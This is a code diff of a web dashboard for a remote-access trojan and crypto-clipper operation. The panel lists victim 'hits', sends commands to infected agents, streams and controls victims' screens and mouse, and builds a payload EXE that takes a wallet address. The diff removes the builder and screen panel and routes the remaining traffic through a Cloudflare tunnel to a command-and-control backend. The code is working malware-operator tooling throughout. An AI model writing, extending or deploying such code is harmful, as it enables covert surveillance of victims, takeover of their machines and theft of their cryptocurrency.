@@ -139,13 +139,7 @@
                 <div class="panel-header">Build Options</div>
                 <div class="panel-content">
                     <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 20px;">Select the format for your payload.</p>
-                    
-                    <div style="margin-bottom: 20px;">
-                        <label style="display: block; font-size: 12px; margin-bottom: 8px; color: var(--text-muted);">Crypto Clipper Address (BTC/ETH/etc):</label>
-                        <input type="text" class="cmd-input" id="cryptoAddressInput" placeholder="Enter your wallet address..." value="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" style="width: 100%; max-width: 400px; margin-bottom: 20px;">
-                    </div>
-
-                    <button class="btn" id="buildExeBtn">Generate EXE</button>
+                    <button class="btn" onclick="alert('Use the local compiler script on your PC to build the EXE.')">Generate EXE</button>
                 </div>
             </div>
         </div>
@@ -156,20 +150,6 @@
             <div class="panel">
                 <div class="panel-header">Recent Hits</div>
                 <div class="panel-content" id="hits-list"><div style="text-align: center; color: var(--text-muted);">No hits found</div></div>
-            </div>
-        </div>
-
-        <!-- LIVE SCREEN -->
-        <div id="page-screen" class="page">
-            <div class="page-header"><div class="page-title">Live Screen & Control</div><div class="page-subtitle">Spy on the user and click to control their mouse.</div></div>
-            <div class="panel">
-                <div class="panel-header">Target Screen</div>
-                <div class="panel-content">
-                    <div class="agent-selector" id="screen-agent-buttons"></div>
-                    <div class="stream-container" onclick="handleMouseClick(event)" style="position: relative; background: #000; border-radius: 8px; overflow: hidden; cursor: crosshair; border: 1px solid var(--border);">
-                        <img id="live-screen" src="" style="width: 100%; height: auto; display: block;" alt="Select an agent to start streaming">
-                    </div>
-                </div>
             </div>
         </div>
 
@@ -220,6 +200,9 @@
     </div>
 
     <script>
+        // REPLACE THIS URL WITH YOUR CLOUDFLARE TUNNEL URL
+        const API_BASE = "https://visitors-sleep-chief-simulation.trycloudflare.com";
+
         let currentStreamIp = "";
         let streamInterval = null;
 
@@ -236,7 +219,7 @@
         }
 
         async function sendCmd(ip, cmd) {
-            await fetch('http://localhost:8000/api/cmd', {
+            await fetch(`${API_BASE}/api/cmd`, {
                 method: 'POST',
                 body: JSON.stringify({ ip: ip, cmd: cmd })
             });
@@ -249,7 +232,7 @@
 
         async function fetchHits() {
             try {
-                const res = await fetch('http://localhost:8000/api/hits', { cache: 'no-store' });
+                const res = await fetch(`${API_BASE}/api/hits`, { cache: 'no-store' });
                 const hits = await res.json();
                 const uniqueAgents = {};
                 hits.forEach(h => uniqueAgents[h.ip] = h);
@@ -275,7 +258,7 @@
                                 </div>
                             </div>
                             <div class="hit-details" id="hit-details-${i}">
-                                <pre style="display: block;">${hit.raw}</pre>
+                                <pre style="display: block;">Raw data stored in backend.</pre>
                             </div>
                         </div>
                     `).join('');
@@ -378,7 +361,7 @@
             if (streamInterval) clearInterval(streamInterval);
             streamInterval = setInterval(async () => {
                 try {
-                    const res = await fetch(`http://localhost:8000/api/stream?ip=${ip}`, { cache: 'no-store' });
+                    const res = await fetch(`${API_BASE}/api/stream?ip=${ip}`, { cache: 'no-store' });
                     const b64 = await res.text();
                     if (b64) {
                         const cleanB64 = b64.replace(/(\r\n|\n|\r)/gm, "");
@@ -403,29 +386,6 @@
             const targetY = Math.round(yPercent * 1080);
             sendCmd(currentStreamIp, `mouse ${targetX} ${targetY} 2`);
         }
-
-        document.getElementById('buildExeBtn').addEventListener('click', async (e) => {
-            const btn = e.target;
-            const cryptoAddress = document.getElementById('cryptoAddressInput').value;
-            
-            btn.innerText = "Compiling...";
-            btn.disabled = true;
-            try {
-                const res = await fetch('http://localhost:8000/api/build', { 
-                    method: 'POST',
-                    body: JSON.stringify({ crypto: cryptoAddress })
-                });
-                const blob = await res.blob();
-                const url = window.URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url; a.download = 'Aegis_Agent.exe'; a.click();
-            } catch (err) {
-                alert("Build failed.");
-            } finally {
-                btn.innerText = "Generate EXE";
-                btn.disabled = false;
-            }
-        });
 
         fetchHits();
         setInterval(fetchHits, 2000);
